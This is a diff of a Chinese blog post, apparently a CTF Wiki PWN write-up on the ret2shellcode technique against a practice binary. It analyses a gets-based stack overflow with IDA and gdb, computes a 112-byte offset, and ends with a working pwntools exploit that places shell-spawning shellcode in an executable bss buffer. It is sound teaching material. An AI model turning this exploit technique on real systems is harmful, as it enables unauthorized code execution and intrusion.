@@ -23,13 +23,19 @@
 <meta property="og:site_name" content="Sinky&#39;s Blog">
 <meta property="og:description" content="原理ret2shellcode,即控制程序执行shellcode代码，shellcode指用于完成某个功能的汇编代码，常见功能主要是获取目标系统的shell,一般来说shellcode需要自己填充。 控制程序执行shellcode。在栈溢出的基础上，若想在执行shellcode,需要对应的binary在运行时shellcode所在的区域具有可执行权限。 下载程序： https:&#x2F;&#x2F;pan.baid">
 <meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://s2.loli.net/2022/12/08/vDUj3E2pV7l6QAJ.png">
+<meta property="og:image" content="https://s2.loli.net/2022/12/08/gMj8EZsni9acCJu.png">
+<meta property="og:image" content="https://s2.loli.net/2022/12/08/ekNcTuOyb2lp1x4.png">
+<meta property="og:image" content="https://s2.loli.net/2022/12/08/ISxJMn6FzAqTdLD.png">
+<meta property="og:image" content="https://s2.loli.net/2022/12/08/4GmfaT2AFNRLcSw.png">
 <meta property="article:published_time" content="2022-12-07T08:44:02.905Z">
-<meta property="article:modified_time" content="2022-12-07T08:47:47.380Z">
+<meta property="article:modified_time" content="2022-12-08T08:30:17.638Z">
 <meta property="article:author" content="Sinky">
 <meta property="article:tag" content="ROP">
 <meta property="article:tag" content="栈溢出">
 <meta property="article:tag" content="CTFWikiPWN">
 <meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://s2.loli.net/2022/12/08/vDUj3E2pV7l6QAJ.png">
   
   
   
@@ -224,7 +230,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          240 words
+          1.5k words
         
       </span>
     
@@ -235,7 +241,7 @@
         
         
         
-          3 mins
+          13 mins
         
       </span>
     
@@ -282,7 +288,63 @@
 <p>控制程序执行shellcode。在栈溢出的基础上，若想在执行shellcode,需要对应的binary在运行时shellcode所在的区域具有可执行权限。</p>
 <p>下载程序：</p>
 <p><a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1VR8Ei39cozSaIjZa3laHkQ">https://pan.baidu.com/s/1VR8Ei39cozSaIjZa3laHkQ </a><br>提取码：r94f</p>
-<h1 id="分析程序"><a href="#分析程序" class="headerlink" title="分析程序"></a>分析程序</h1>
+<h1 id="分析程序"><a href="#分析程序" class="headerlink" title="分析程序"></a>分析程序</h1><p>checksec查看保护：</p>
+<p><img src="https://s2.loli.net/2022/12/08/vDUj3E2pV7l6QAJ.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<p>32位，啥都没开。含有RWX段（可读可写可执行）</p>
+<p>IDA看一下：</p>
+<figure class="highlight scss"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs scss">int __cdecl <span class="hljs-selector-tag">main</span>(int argc, const char **argv, const char **envp)<br>{<br>  char s<span class="hljs-selector-attr">[100]</span>; <span class="hljs-comment">// [esp+1Ch] [ebp-64h] BYREF</span><br>  <span class="hljs-built_in">setvbuf</span>(stdout, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);<br>  <span class="hljs-built_in">setvbuf</span>(stdin, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);<br>  <span class="hljs-built_in">puts</span>("No system for you this time !!!");<br>  <span class="hljs-built_in">gets</span>(s);<br>  <span class="hljs-built_in">strncpy</span>(buf2, s, <span class="hljs-number">0</span>x64u);<br>  <span class="hljs-built_in">printf</span>("bye bye ~");<br>  return <span class="hljs-number">0</span>;<br>}<br></code></pre></td></tr></tbody></table></figure>
+
+<p>存在strncpy函数，栈溢出漏洞，将对应字符串s复制到buf2处。buf2在bss段：</p>
+<p><img src="https://s2.loli.net/2022/12/08/gMj8EZsni9acCJu.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<p>buf2地址：<code>0x0804A080</code></p>
+<p>查看call调用位置：</p>
+<p><img src="https://s2.loli.net/2022/12/08/ekNcTuOyb2lp1x4.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<p>gdb在此处断点：</p>
+<pre><code class="hljs">b *0x080485AF
+</code></pre>
+<p><img src="https://s2.loli.net/2022/12/08/ISxJMn6FzAqTdLD.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<p>字符串地址：<code>0xffffd48c</code></p>
+<p>ebp地址：<code>0xffffd4f8</code></p>
+<pre><code class="hljs">0xffffd4f8 - 0xffffd48c = 0x6C
+</code></pre>
+<p>偏移量：<code>0x6c+4</code></p>
+<p>程序将s复制到buf2处，且buf2在bss段，在main处断点调试程序，运行之后利用vmmap查看。</p>
+<ul>
+<li>vmmap 用于查看程序各种段的地址和范围</li>
+</ul>
+<p><img src="https://s2.loli.net/2022/12/08/4GmfaT2AFNRLcSw.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<p>发现可执行bss段：</p>
+<pre><code class="hljs">0x0804a000 0x0804b000 rwxp	…/pwn_soft/ret2shellcode
+</code></pre>
+<p>我们可以控制程序执行bss段处的shellcode</p>
+<h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><h2 id="思路："><a href="#思路：" class="headerlink" title="思路："></a>思路：</h2><p>gets函数将获得内容复制给buf2数组，buf2未在main内定义，是未初始化的全局变量，且在.bss段，可以通过shellcraft.sh()函数，创造一个shell，将其写入buf2，通过栈溢出，将函数的返回地址覆盖为shell地址，即可获取shell。</p>
+<ul>
+<li><code>asm(shellcraft.sh())</code>  产生一个32位shell</li>
+<li><code>asm(shellcraft.amd64.sh())</code> 产生一个64位shel</li>
+<li><code>context(os=’linux’, arch=’amd64’, log_level=’debug’)</code><ul>
+<li>os设置系统为linux系统,大多数pwn题目的系统都是linux</li>
+<li>arch设置为amd64，可以简单的认为设置为64位的模式，对应的32位模式是i386</li>
+<li>log_level设置日志输出的等级为debug，这句话在调试的时候一般会设置，将完整的io过程打印下来，方便调试.</li>
+</ul>
+</li>
+</ul>
+<p>信息：</p>
+<pre><code class="hljs">buf2_addr = 0x0804A080
+偏移量：0x6c + 4 = 112
+</code></pre>
+<p>exp:</p>
+<pre><code class="hljs">from pwn import *
+p=process('./ret2shellcode')
+shell=asm(shellcraft.sh())
+buf2_addr=0x0804A080
+payload=shell.ljust(112,b'A')+p32(buf2_addr)
+p.sendline(payload)
+p.interactive()
+</code></pre>
+<ul>
+<li><code>shell.ljust(112,b'A')</code> 表示从机器码后方添加是数据直到总长112字节</li>
+</ul>
+
                 
               </div>
             
@@ -352,6 +414,12 @@
                 <div class="post-prevnext my-3">
                   <article class="post-prev col-6">
                     
+                    
+                      <a href="/2022/12/08/%E5%9F%BA%E6%9C%ACROP%E4%B9%8Bret2syscall/" title="基本ROP之ret2syscall">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">基本ROP之ret2syscall</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
                     
                   </article>
                   <article class="post-next col-6">
